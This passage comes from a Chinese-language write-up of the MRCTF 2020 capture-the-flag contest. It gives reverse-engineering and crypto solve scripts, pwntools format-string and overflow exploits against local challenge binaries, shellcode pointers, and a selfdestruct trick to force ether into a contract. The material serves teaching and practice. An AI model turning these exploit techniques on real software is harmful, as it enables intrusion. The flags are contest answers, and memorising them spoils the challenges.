sub_B822E0(&byte_BA1708[v4], 46, 3 - v3); } } return v2; } \u4e0d\u96be\u53d1\u73b0\u5c31\u662f\u4e2abase64\u53d8\u79cd\uff0c\u4e0d\u8fc7\u5c31\u662f\u628a\u8868\u6362\u4e86\u4e00\u4e0b\uff0c\u7b49\u4e8e\u53f7\u6362\u6210\u70b9\u800c\u5df2 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&*(+/ \u6700\u540e\u5728\u548c\u5df2\u6709\u5b57\u7b26\u4e32\u6bd4\u8f83 \u6240\u4ee5\u601d\u8def\u5f88\u7b80\u5355: \u89e3\u53d8\u79cdbase64->\u5faa\u73af\u5de6\u79fb4\u4f4d->\u5f02\u62163->\u5f97\u5230flag EXP import base64 orig=\"%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm%w..\" orig=orig.replace(')','0') orig=orig.replace('!','1') orig=orig.replace('@','2') orig=orig.replace('#','3') orig=orig.replace('$','4') orig=orig.replace('%','5') orig=orig.replace('^','6') orig=orig.replace('&','7') orig=orig.replace('*','8') orig=orig.replace('(','9') orig=orig.replace('.','=') print orig code=base64.b64decode(orig).encode('hex') flag=\"\" for x in range(0,len(code),2): num=int(code[x:x+2],16) num=(((num>>4)&0xff) | ((num<<4)&0xff)) flag+=chr(num^3) print flag MRCTF{junkjunkjunkcodejunkjunkcodejunkcode} EasyCPP \u7a0b\u5e8f\u8fd0\u7528\u4e86\u8f83\u591a\u7684C++\u7279\u6027 \u6240\u4ee5\u4ee3\u7801\u770b\u8d77\u6765\u4f1a\u6bd4\u8f83\u5197\u6742\uff0c\u597d\u5728\u7ed9\u4e86\u7b26\u53f7 \u603b\u4f53\u4e0a\u662f\u8981\u8f93\u51659\u4e2a\u6570\u5b57\uff0c\u5e76\u5b58\u5165\u4e86Vector \u7136\u540e\u901a\u8fc7lambda\u8868\u8fbe\u5f0f\u8fdb\u884c\u4e86\u6bcf\u4e2a\u6570\u5b57\u5f02\u62161\u7684\u64cd\u4f5c\uff0c\u7136\u540e\u5bf9\u7ed3\u679c\u8c03\u7528\u4e86\u4e2adepart\u7684\u51fd\u6570 \u5f97\u5230\u4e00\u4e2astring\u7684\u7ed3\u679c\uff0c\u6700\u540e\u548c\u539f\u6709\u76849\u4e2a\u5947\u602a\u5b57\u7b26\u4e32\u6bd4\u8f83 \u6700\u540e\u8f93\u51fa\u4e5d\u4e2a\u6570\u5b57\u62fc\u8d77\u6765\u7684\u5b57\u7b26\u4e32\uff0cflag\u5c31\u662f\u8981\u628a\u8fd9\u4e5d\u4e2a\u6570\u5b57\u62fc\u8d77\u6765\u8fdb\u884cmd5\u6821\u9a8c\u540e\u5305\u8d77\u6765 \u7136\u540e\u6765\u5206\u6790\u4e0bdepart\u51fd\u6570\u548c\u90a3\u4e2a\u8d1f\u8d23\u66ff\u6362\u7684lambda\u8868\u8fbe\u5f0f __int64 __fastcall depart(int a1, __int64 a2, double a3) { char v4; // [rsp+20h] [rbp-60h] char v5; // [rsp+40h] [rbp-40h] int i; // [rsp+68h] [rbp-18h] int v7; // [rsp+6Ch] [rbp-14h] v7 = a1; for ( i = 2; ; ++i ) { std::sqrt<int>((unsigned int)a1); //\u679a\u4e3e\u5230\u6839\u53f7n if ( a3 < (double)i ) break; if ( !(a1 % i) ) //\u80fd\u5206\u89e3\u5c31\u5206\u89e3 { v7 = i; depart((unsigned int)(a1 / i), a2); //\u9012\u5f52\u5206\u89e3 break; } } std::__cxx11::to_string((std::__cxx11 *)&v5, v7); //\u5c06\u6570\u5b57\u8f6c\u4e3a\u5b57\u7b26\u4e32\u4ee5\u7a7a\u683c\u4e3a\u95f4\u9694\u7b26\u5408\u5e76\u8d77\u6765 std::operator+<char,std::char_traits<char>,std::allocator<char>>(&v4, &unk_500C, &v5); std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator+=(a2, &v4); std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v4); return std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v5); } \u6700\u540e\u90a3\u4e2a\u6bd4\u8f83\u51fd\u6570\u5176\u5b9e\u5c31\u662f replace(a.begin(),a.end(),'0','O'); replace(a.begin(),a.end(),'1','l'); replace(a.begin(),a.end(),'2','z'); replace(a.begin(),a.end(),'3','E'); replace(a.begin(),a.end(),'4','A'); replace(a.begin(),a.end(),'5','s'); replace(a.begin(),a.end(),'6','G'); replace(a.begin(),a.end(),'7','T'); replace(a.begin(),a.end(),'8','B'); replace(a.begin(),a.end(),'9','q'); replace(a.begin(),a.end(),' ','='); \u5c06\u8fd9\u4e9b\u4e1c\u897f\u66ff\u6362\u56de\u6570\u5b57\uff0c\u518d\u628a\u8fd9\u4e9b\u6570\u5b57\u4e58\u8d77\u6765\uff0c\u518d\u5f02\u62161\u4e00\u4e0b\u5c31\u662f\u8f93\u5165\u7684\u4e5d\u4e2a\u6570\u5b57 2345 1222 5774 2476 3374 9032 2456 3531 6720 MRCTF{4367FB5F42C6E46B2AF79BF409FB84D3} Shit \u8fd9\u9053\u9898\u76ee\u662f\u4e34\u65f6\u51fa\u7684\uff0c\u5176\u5b9e\u53ea\u8981\u8fc7\u6389\u5f00\u5c40\u7684\u4e00\u4e2a\u6b7b\u5faa\u73af\uff0c\u4e5f\u53ef\u4ee5attach\uff0c\u7136\u540edump\u51fa\u5bc6\u94a5 \u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u89e3\u5bc6\u4e86\uff0c\u89e3\u5bc6\u7b97\u6cd5\u5176\u5b9e\u5c31\u662f\u52a0\u5bc6\u7b97\u6cd5\u7684\u9006\u5411\u8fc7\u7a0b\uff0c\u5168\u662f\u4f4d\u8fd0\u7b97 //key\u5c31\u662f\u5bc6\u94a5 \u8bf7\u76f4\u63a5dump unsigned int ks[6]={0x8c2c133a,0xf74cb3f6,0xfedfa6f2,0xab293e3b,0x26cf8a2a,0x88a1f279}; void decode() { unsigned int k=0,bk=0; for(int i=5;i>=0;i--) if(i>0) ks[i]^=ks[i-1]; for(int i=0;i<24;i+=4) { k=ks[i/4]; k=(1<<key[i/4])^k; k=((k>>16)) | ((~(k<<16))&0xffff0000); k=((k<<key[i/4])) | (k>>(32-key[i/4])); printf(\"%X\\n\",k); } } \u89e3\u5bc6\u51fa\u516d\u4e2aint\uff0c\u76f4\u63a5\u8f6cascii\u5c31\u662fflag Virtual Tree \u8fd9\u9053\u9898\u9759\u6001\u5206\u6790\u5b8c\u5168\u5c31\u662f\u9519\u7684\uff0c\u56e0\u4e3a\u6211\u5728main\u51fd\u6570\u8fd0\u884c\u524d\u4f1a\u5c06\u4e00\u4e9b\u51fd\u6570\u7ed9\u66ff\u6362\u6389 \u6240\u4ee5\u9759\u6001\u5206\u6790\u5b8c\u5168\u5931\u8d25\u7684\uff0c\u4f46\u662f\u4f3c\u4e4e\u5927\u90e8\u5206\u4eba\u90fd\u662f\u52a8\u8c032333 int replace() //\u5f00\u5c40\u66ff\u6362\u51fd\u6570\u4ee3\u7801\uff0c { void *addr=doit; int val=(int)addr; DWORD old; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&old)==NULL) exit(0); int count=0; while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==0x00401510) *((PDWORD)val)=(DWORD)list[count++]; //\u5c06\u4e00\u4e2a\u5168\u662f\u540c\u4e00\u4e2acall\u7684\u51fd\u6570\u66ff\u6362\u6210\u4e0d\u4e00\u6837\u7684\u51fd\u6570 val=val+1; } addr=main; val=(int)addr; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&old)==NULL) exit(0); while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==(DWORD)walkB) { *((PDWORD)val)=(DWORD)walkA; //\u52a0\u5bc6\u4ee3\u7801\u7684\u66ff\u6362 break; } val=val+1; } } \u6240\u4ee5\uff0c\u9700\u8981\u52a8\u8c03\u6765\u770b\u4ee3\u7801\uff0c\u4ee3\u7801\u624d\u662f\u5bf9\u7684\u3002\u3002 int sub_12F16F0() //\u5177\u4f53\u64cd\u4f5c\u5c31\u662f\u8fd9\u4e9b\u52a0\u51cf \u5f02\u6216 { Add(0, 10); Xor(1, 2); Add(2, 7); Sub_abs(3, 7); Xor(4, 5); Sub_abs(6, 1); Add(7, 3); Xor(8, 7); Sub_abs(9, 8); Sub_abs(10, 7); Xor(11, 12); Sub_abs(12, 2); Xor(14, 15); return Add(15, 2); } \u8fd8\u6709\u4e00\u4e2a\u51fd\u6570\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86\u5f02\u6216\uff0cdump\u51fa\u6765\u5c31\u662f\u4e86\u3002\u3002 \u6240\u4ee5\u53ea\u9700\u8981\u5c06\u6570\u636e\u6309\u7167sub_12F16F0()\u89e3\u65b9\u7a0b\u4e4b\u540e\uff0c\u5728\u5f02\u6216dump\u51fa\u6765\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u5f97\u5230flag\u4e86 @_7r3e_f0r_fuNN! Crypto keyboard \u5176\u5b9e\u5c31\u662f\u624b\u673a\u952e\u76d8 \u6bcf\u884c\u4ee3\u8868\u5f53\u4e2a\u6570\u5b57\u952e\u76d8\u4e0a\u7684\u5b57\u6bcd\u6441\u4e00\u6b21\u5c31\u662f\u7b2c\u4e00\u4e2a \u4ee5\u6b64\u7c7b\u63a8\u3002 \u5929\u5e72\u5730\u652f+\u7532\u5b50 \u67e5\u627e\u5230\u5929\u5e72\u5730\u652f\u56fe\uff0c\u53d1\u73b0\u6bcf\u4e2a\u90fd\u5bf9\u5e94\u7740\u6570\u5b57\uff0c\u7136\u540e\u7532\u5b50\u662f60\uff0c\u628a\u6bcf\u4e2a\u90fd\u52a0\u4e0a 60\u540e\u7528ascii\u7801\u8f6c\u4e0b\u5c31\u53ef\u4ee5\u4e86 babyRSA \u8fd9\u9898\u672c\u8eab\u9664\u4e86RSA\u8003\u70b9\u5916\uff0c\u8fd8\u8003\u5bdf\u4e86\u6a21\u5e73\u65b9\u7b97\u6cd5\uff0c\u90a3\u4e2aQ\u5982\u679c\u786c\u603c\u662f\u603c\u4e0d\u51fa\u6765\u7684\uff0c\u5fc5\u987b\u6a21\u5e73\u65b9\uff0c\u81f3\u4e8e\u6a21\u5e73\u65b9\u7b97\u6cd5\u4ee3\u7801\u7f51\u4e0a\u86ee\u591a\uff0c\u6211\u8fd9\u5c31\u4e0d\u8d34\u4e86 easy_RSA \u6bd4\u8f83\u5178\u578b\u7684RSA\u5957\u5a03\uff0c\u5206\u522b\u6c42\u51fap,q\uff0c\u5229\u7528\u9898\u5e72\u4e2d\u7684\u4e00\u4e9b\u51fd\u6570\u5373\u53ef\u6c42\u89e3\uff0c p\uff1a\u5df2\u77e5$\\phi(n)=(p-1)(q-1)$, $n=pq$\uff0c\u5229\u7528z3\u7684solve\u5bb9\u6613\u6c42\u89e3 q\uff1a\u5df2\u77e5$ed, n=pq$\uff0c\u53ef\u77e5$ed=k(p-1)(q-1)+1$\uff0c \u53c8\u7531\u4e8e$\\frac{ed-1}{n} \\leq k \\leq \\frac{ed-1}{2n}$ \u5229\u7528\u8fd9\u4e2a\u533a\u95f4\uff0c\u5faa\u73afsolve\u5373\u53ef\uff0cexp\u5982\u4e0b\uff1a import sympy from gmpy2 import invert from Crypto.Util.number import getPrime, long_to_bytes from z3 import * base = 65537 def gen_prime(N): while 1: A = getPrime(N) if A % 4 == 3: break return A def GET_P(n, F_n): p = Int('p') q = Int('q') expr = And(F_n == (p - 1) * (q - 1), n == p * q, p > 0, q > 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() seed2 = 2021 * res_p + 2020 * res_q if seed2 < 0: seed2 = (-1) * seed2 return sympy.nextprime(seed2) def GET_Q(n, E_D ,judge): p = Int('p') q = Int('q') for k in range(judge, judge*2): expr = And(E_D - 1 == k * (p - 1) * (q - 1), n == p * q, p > 0, q > 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() break seed2 = 2021 * res_p - 2020 * res_q if seed2 < 0: seed2 = (-1) * seed2 return sympy.nextprime(seed2) P_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693 P_F_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740 Q_n = 20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947 Q_E_D = 100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201 Ciphertext = 40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021 if __name__ == \"__main__\": judge = int(Q_E_D / Q_n) - 1 _E = base P = GET_P(P_n, P_F_n) Q = GET_Q(Q_n, Q_E_D, judge) _D = invert(_E, (P-1)*(Q-1)) M = pow(Ciphertext, _D, P*Q) flag = long_to_bytes(M) print(flag) real_random \u5229\u7528\u4e86\u7ebf\u6027\u540c\u4f59\u6765\u6784\u9020\u4f2a\u968f\u673a\uff0c\u89c2\u5bdf\u53d1\u73b0b,c,m\u6ee1\u8db3\u6700\u5927\u5468\u671f\u6761\u4ef6\uff0c\u6545\u77e5\u6bcf\u6b21\u4ee5flag[t]\u4e3a\u79cd\u5b50\u751f\u6210\u7684\u968f\u673a\u6570\u5217\u7684\u5468\u671f\u5747\u4e3am\uff0c\u901a\u8fc7\u6cc4\u9732\u7684(p-1)*(q-1)\u53ef\u4ee5\u7b97\u51fam\uff0c\u7136\u540e\u51cf\u53bb$2^d$\uff08\u8bb0\u5f97\u53d6\u6a21\uff09\u5373\u53ef\u6c42\u89e3 \u53e4\u5178\u5bc6\u7801\u77e5\u591a\u5c11 \u732a\u5708\u5bc6\u7801\uff0c\u5723\u5802\u6b66\u58eb\u5bc6\u7801\uff0c\u6807\u51c6\u94f6\u6cb3\u5b57\u6bcd\uff0c\u4e14\u5df2\u63d0\u793a\u90fd\u4e3a\u5927\u5199\u5b57\u6bcd \u89e3\u5bc6\u53ef\u5f97 FGCPFLIRTUASYON , \u56fe\u7247\u91cc\u4e5f\u63d0\u793a fence \uff0c\u6545\u5c1d\u8bd5\u6805\u680f\u5bc6\u7801 \u6bcf\u7ec4\u5b57\u6570\u4e3a3\u65f6\u5373\u53ef\u89e3\u5f97flag\uff1a MRCTF{CRYPTOFUN} PWN nothing_but_everything \u672c\u8eab\u662f\u7b80\u5355\u7684ROP\uff0c\u4f46\u662f\u6211\u9759\u6001\u7f16\u8bd1\u4e86\u4e00\u4e0b\u540e\uff0c\u53bb\u4e86\u7b26\u53f7\uff0c\u6240\u4ee5\u5982\u679c\u60f3\u770b\u7684\u6bd4\u8f83\u8f7b\u677e\uff0c\u9700\u8981\u53bb\u627e\u627eUbuntu\u4e0b\u7684sig\u6587\u4ef6\u7136\u540eida\u91cc\u5bfc\u5165\uff0c\u5c31\u53ef\u4ee5\u590d\u73b0\u4e0d\u5c11\u51fd\u6570\u7684\u6837\u5b50\u4e86\uff0c\u6216\u8005\u53ef\u4ee5\u7ed3\u5408\u52a8\u8c03\uff0c\u603b\u4e4b\u770b\u61c2\u9898\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u76f4\u63a5ROPgadget\u4e00\u628a\u68ad\u3002 easy_equation \uff08\u4e0b\u9762\u8bf4\u7684\u90fd\u6ca1\u7528\uff0c\u8fd9\u9898\u5fd8\u5173\u6ea2\u51fa\u4e86\uff0c\u76f4\u63a5\u6ea2\u51fa\u5c31\u884c \u5f88\u660e\u663e\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u6f0f\u6d1e\uff0c\u4f46\u662f\u5728\u5229\u7528\u4e0a\u9700\u8981\u4e00\u4e9b\u6280\u5de7\uff0c\u9996\u5148\u662f\u770b\u5230\u90a3\u4e2a\u516c\u5f0f\uff0c\u7528z3\u7684solve\u5f88\u597d\u7b97\u51fa\u6765\u89e3\u662f2\uff0c\u4e4b\u540e\u601d\u8def\u5c31\u5f88\u660e\u786e\uff0c\u5c06judge\u7684\u503c\u8986\u5199\u62102\u5373\u53ef\uff0c\u5982\u679c\u76f4\u63a5\u60f3\u8981\u76f4\u63a5\u7528fmstr_payload\u8fd9\u79cdpayload\u81ea\u52a8\u751f\u6210,\u4f1a\u60ca\u559c\u7684\u53d1\u73b0\uff0c\u65e0\u6cd5\u9760\u586b\u5145\u5b57\u7b26\u8fbe\u5230\u5730\u5740\u5bf9\u9f50\uff0c\u6240\u4ee5\u9700\u8981\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u8003\u8651\u5230\u5730\u5740\u7684\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c \u5982\u679c\u5728judge_addr-1\u7684\u4f4d\u7f6e\u5b58\u51650x200\uff0c\u90a3\u4e48judge_addr\u7684\u503c\u81ea\u7136\u4f1a\u53d8\u62100x02\uff0c\u4e8e\u662fexp\uff08\u4e0d\u662f\u552f\u4e00\u89e3\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u6b63\u5411\u6784\u9020\uff09\u5982\u4e0b\uff1a from pwn import * p = process('easy_equation') judge_addr = 0x60105C payload = 'a' * 6 + '%' + str(0x200 - 6) + 'c%10$hn' payload += p64(judge_addr - 1) p.sendline(payload) p.interactive() spfa \u6709\u4e00\u4e2a\u660e\u663e\u7684get_flag\u51fd\u6570\uff0c\u53d1\u73b0\u6267\u884c\u8be5\u51fd\u6570\u7684\u6761\u4ef6\u662fflag!=-1\uff0c\u4f46\u662f\u7a0b\u5e8f\u5f00\u5934\u5df2\u7ecf\u5c06flag\u8d4b\u503c\u4e3a-1\uff0c\u5e76\u4e14\u7a0b\u5e8f\u5185\u5e76\u6ca1\u6709\u6d89\u53caflag\u7684\u8fd0\u7b97\uff0c\u4e8e\u662f\u8003\u8651\u901a\u8fc7\u6ea2\u51fa\u4fee\u6539flag\u3002 \u67e5\u770b\u4e00\u4e0bbss\u6bb5\u53ef\u4ee5\u53d1\u73b0\uff0cflag\u53d8\u91cf\u5728qu\u6570\u7ec4\u4e0b\u65b9\uff0c\u76f8\u5f53\u4e8equ[1000]\uff0c\u5728SPFA\u51fd\u6570\u91cc\u7406\u8bba\u53ef\u4ee5\u8bbf\u95ee\u5e76\u4fee\u6539qu[1000]\uff0c\u4e8e\u662f\u9700\u8981\u6784\u5efa\u7279\u6b8a\u7684\u56fe\u6765\u4f7f\u961f\u5217\uff08qu\u6570\u7ec4\uff09\u8d8a\u754c\u3002 \u4ed4\u7ec6\u5206\u6790\u53ef\u4ee5\u77e5\u9053\uff0cSPFA\u7b97\u6cd5\u5b58\u5728\u4e00\u5904\u5224\u65ad\u9519\u8bef(if(d[y] >= d[x] + len[node]))\uff0c\u8fd9\u4f7f\u5f97\u5982\u679c\u8def\u5f84\u4e2d\u51fa\u73b00\u73af\u4f1a\u53d1\u751f\u6b7b\u5faa\u73af\uff0c\u8282\u70b9\u4e0d\u65ad\u5165\u961f\uff0c\u6700\u540e\u4f7f\u961f\u5217\u6ea2\u51fa\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u6240\u505a\u7684\uff0c\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a0\u73af\uff0c\u7136\u540e\u6c42\u6700\u77ed\u8def\u3002 exp\uff1a from pwn import * p = process(\"./spfa\") def add(a, b, c): p.sendlineafter(\":\\n\", str(1)) p.sendlineafter(\":\\n\", str(a) + \" \" + str(b) + \" \" + str(c)) def query(a, b): p.sendlineafter(\":\\n\", str(2)) p.sendlineafter(\":\\n\", str(a) + \" \" + str(b)) def get_flag(): p.sendlineafter(\":\\n\", str(3)) add(1, 2, 0) add(2, 1, 0) query(1, 2) get_flag() p.interactive() Shellcode \u4e3b\u8981\u60f3\u8003\u5bdfGooglehack\u80fd\u529b \u6ca1\u5565\u597d\u8bf4\u7684 \u76f4\u63a5\u53bb http://shell-storm.org/shellcode/ \u6252\u4e2ax64 shellcode\u4e0b\u6765\u5c31\u53ef\u4ee5\u4e86 Shellcode Revenge \u4e3b\u8981\u60f3\u8003\u5bdfGooglehack\u80fd\u529b ida\u53ef\u4ee5\u5206\u6790\u51fa\u63d0\u4ea4\u7684Shellcode\u8981\u6ee1\u8db3\u5168\u4e3a\u5927\u5c0f\u5199\u548c\u6570\u5b57\u7684\u9650\u5236 \u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0 https://hama.hatenadiary.jp/entry/2017/04/04/190129","title":"MRCTF\u65b0\u751f\u8d5b 2020"},{"location":"writeup/MRCTF-2020/#mrctf-2020","text":"","title":"MRCTF\u65b0\u751f\u8d5b 2020"},{"location":"writeup/MRCTF-2020/#blockchains","text":"","title":"Blockchains"},{"location":"writeup/MRCTF-2020/#simplereveal","text":"\u672c\u9898\u4e3b\u8981\u8003\u5bdf\u5bf9 solidity \u548c web3 \u7684\u5e94\u7528\u3002 \u89e3\u6cd5\u4e00 pragma solidity>=0.4.22; contract reveal { private string flag=\"some_string_here\"; } \u6839\u636e\u539f\u5408\u7ea6\uff0c\u53ef\u4ee5\u770b\u5230 flag \u5e94\u8be5\u5728\u5408\u7ea6\u7684\u524d\u51e0\u4e2a\u53d8\u91cf\u69fd\u4e2d\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 web3.eth.getStorageAt(\"\u5408\u7ea6\u5730\u5740\", 0) \u83b7\u53d6\u5b58\u50a8\u7684\u53d8\u91cf\uff0c\u4ece\u800c\u89e3\u7801\u5f97\u5230flag\u3002 \u89e3\u6cd5\u4e8c Etherscan \u4e0a\u53ef\u4ee5\u770b\u5230\u521b\u5efa\u5408\u7ea6\u4fe1\u606f\uff0c\u5176\u4e2d\u53ef\u4ee5\u770b\u5230 flag \u3002","title":"SimpleReveal"},{"location":"writeup/MRCTF-2020/#unwanted-coin","text":"pragma solidity >=0.6.1; contract Modcoin { mapping(uint256 => bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,\"Not Wanted value\"); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } } \u539f\u5408\u7ea6\u4e2d\u4e24\u4e2a\u652f\u4ed8\u51fd\u6570 recvpay() \u548c fallback() \u90fd\u53ea\u5141\u8bb8\u63a5\u53d7\u5076\u6570\u500d0.001 ether\u7684\u4ed8\u6b3e\uff0c\u800c\u5408\u7ea6\u7684getflag\u51fd\u6570\u5219\u8981\u6c42\u5947\u6570\u500d 0.001 ether \u7684\u5408\u7ea6\u4f59\u989d\u624d\u53ef\u4ee5\u6267\u884c\uff08\u5e76\u6e05\u7a7a\u5408\u7ea6\u4f59\u989d\uff09\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u7ed5\u8fc7\u9650\u5236\u5411\u5408\u7ea6\u5730\u5740\u53d1\u9001ether\uff0c\u800c\u5408\u7ea6\u81ea\u6bc1\u6216\u6316\u77ff\u4ea7\u751f\u7684ether\u662f\u65e0\u6cd5\u62d2\u7edd\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u81ea\u6bc1\u5408\u7ea6\u8fbe\u5230\u6761\u4ef6\u3002 contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); } }","title":"Unwanted Coin"},{"location":"writeup/MRCTF-2020/#misc","text":"","title":"Misc"},{"location":"writeup/MRCTF-2020/#hellomisc_world","text":"\u9644\u4ef6\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1kNc2oD5AkfJuzuCPL_qY5w \u63d0\u53d6\u7801\uff1am4ly \u4e0b\u8f7d\u9644\u4ef6\u5f97\u5230\u4e00\u5f20\u7ea2\u84dd\u56fe\u548c\u4e00\u4e2a\u52a0\u5bc6\u7684rar\u5305\uff0cbinwalk\u5206\u79bb\u56fe\u7247\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u52a0\u5bc6\u7684zip\u5305 + \u7b2c\u4e00\u79cd\u89e3\u6cd5\uff08\u5176\u5b9e\u662f\u4ffa\u7684\u9884\u671f\u89e3\uff0c\u4f46\u662f\u5e08\u5085\u4eec\u7ed9\u4e86\u66f4\u7b80\u5355\u7684\u89e3\u6cd5\uff0c\u53ef\u89c1\u89e3\u6cd5\u4e8c\uff09 \u6839\u636e\u56fe\u7247\u6240\u7ed9\u540d\u79f0\uff0c\u53ef\u4ee5\u5224\u65ad\u56fe\u4e2d\u9690\u85cf\u4e86\u4fe1\u606f\uff0c\u7531\u4e8e\u56fe\u7247\u4e2d\u53ea\u6709\u7ea2\u8272\u548c\u84dd\u8272\uff0c\u6545\u53ef\u4ee5\u60f3\u5230\u5c06\u56fe\u7247\u4e2d\u7684\u7ea2\u8272\u548c\u84dd\u8272\u50cf\u7d20\u5757\u8f6c\u6362\u6210 0 & 1 \u5e8f\u5217\u5e76\u91cd\u65b0\u6784\u5efa\uff0c\u4ee5\u6b64\u53ef\u4ee5\u8fd8\u539f\u5f97\u5230\u4e00\u5f20\u56fe\u7247\uff1a \u751f\u6210\u811a\u672c\uff1a ```python from PIL import Image import bitstring with open('1.png','rb') as f: bitcon = bitstring.Bits(f) im = Image.new('RGB',(1024,780),(255,0,0)) pim = im.load() for i,val in enumerate(bitcon.bin): if val == '0': pim[i%1024,i/1024] = (0,0,255) im.save('red_blue.png') ``` \u89e3\u9898\u811a\u672c\uff1a ```python from PIL import Image import bitstring im = Image.open('try to restore it.png') width = im.size[0] height = im.size[1] pim = im.load() # \u8bfb\u53d6\u56fe\u7247\u7684\u50cf\u7d20\u4fe1\u606f bin_result = '' for h in range(height): for w in range(width): if pim[w,h][0] == 255: # \u5224\u65ad\u662f\u5426\u662f\u7ea2\u8272\uff08R,G,B\uff09[0]\u8868\u793a\u7b2c\u4e00\u901a\u9053 bin_result += '1' else: bin_result += '0'","title":"Hello\uff0cmisc_world\uff01"},{"location":"writeup/MRCTF-2020/#print-bitstringbitarraybinbin_resultbytesencodehex","text":"with open('result.png','wb') as f: f.write(bitstring.BitArray(bin=bin_result).bytes) ``` \u6ce8\uff1a\u7531\u4e8e\u521a\u5f00\u59cb\u65e0\u6cd5\u786e\u5b9a\u957f\u5bbd\u7684\u5185\u5916\u5faa\u73af\u5173\u7cfb\u53ca\u7ea2\u84dd\u5bf9\u5e94\u5173\u7cfb\uff0c\u6545\u53ef\u4ee5\u8fdb\u884c\u591a\u6b21\u5c1d\u8bd5 \u8fd8\u539f\u5f97\u5230\u56fe\u7247\uff0c\u770b\u56fe\u83b7\u5f97\u89e3\u538bzip\u5305\u7684\u5bc6\u7801\uff1a + \u7b2c\u4e8c\u79cd\u89e3\u6cd5 \u7528 stegsolve \u67e5\u770b\u56fe\u7247\uff0c Save Bin \u53ef\u76f4\u63a5\u5f97\u5230\u56fe\u7247\uff1a \u89e3\u5f00\u538b\u7f29\u5305\u540e\u5f97\u5230\u4e00\u4e2a\u6587\u6863\uff0c\u6587\u6863\u4e2d\u4fe1\u606f\uff1a 127 255 63 191 127 191 63 127 127 255 63 191 63 191 255 127 ... \u89c2\u5bdf\u53ef\u77e5\u6587\u6863\u4e2d\u53ea\u542b\u6709 127 255 63 191 \u8fd9\u56db\u4e2a\u6570\u5b57\uff0c\u5c06\u8fd9\u56db\u4e2a\u6570\u5b57\u8f6c\u5316\u4e3a\u4e8c\u8fdb\u5236\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u56db\u4e2a\u6570\u5b57\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e2d 